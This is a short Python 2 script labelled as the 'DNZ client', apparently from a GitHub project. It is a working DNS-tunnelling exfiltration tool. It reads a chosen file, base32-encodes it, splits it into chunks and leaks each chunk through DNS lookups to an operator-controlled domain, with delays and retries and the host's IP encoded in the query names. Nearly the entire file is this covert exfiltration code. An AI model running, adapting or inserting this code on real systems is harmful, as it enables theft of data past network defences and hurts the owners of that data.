#!/usr/bin/env python
### DNZ client by zalt3es
### URL: https://github.com/zalt3es/dnz
import sys, base64, socket, time
fna = "t.txt"
sr = "my.domain.com"
st = 0.0
r=2
fn=1
t = sys.argv
try:
    fna = t[1]
    sr = t[2]
    st = float(t[3])
    r = int(t[4])
    fn = int(t[5])
except:
    pass
print "{0}->{1} d:{3}*{2}s\nf#: {4}".format(fna,sr,st,r,fn)
def rso(u):
    for i in range(0,r):
        try:
            if st != 0.0:
                time.sleep(st)
            ip = socket.gethostbyname(u.replace("=",""))
            if ip=="127.0.0.1":
                return
        except:
            pass
with open(fna, "rb") as f:
    t=base64.b32encode(f.read())
fna = base64.b32encode(fna[-20:]).replace("=","")
a = []
for i in range(0, len(t), 40):
    a.append(t[i:i+40])
p = ""
for i in socket.gethostbyname(socket.gethostname()).split("."):
    p += ("{0}".format(hex(int(i))))[2:].zfill(2)
rso("{0}{1}{2}{3}.{4}".format(p,fn,str(len(a)).zfill(8),fna,sr))
for i in range(0,len(a)):
    print "{0} %".format(int(i*100/len(a)))
    u = a[i]
    rso("{0}{1}{4}{2}.{3}".format(p,fn,u,sr,str(i+1).zfill(4)))
print "100%"
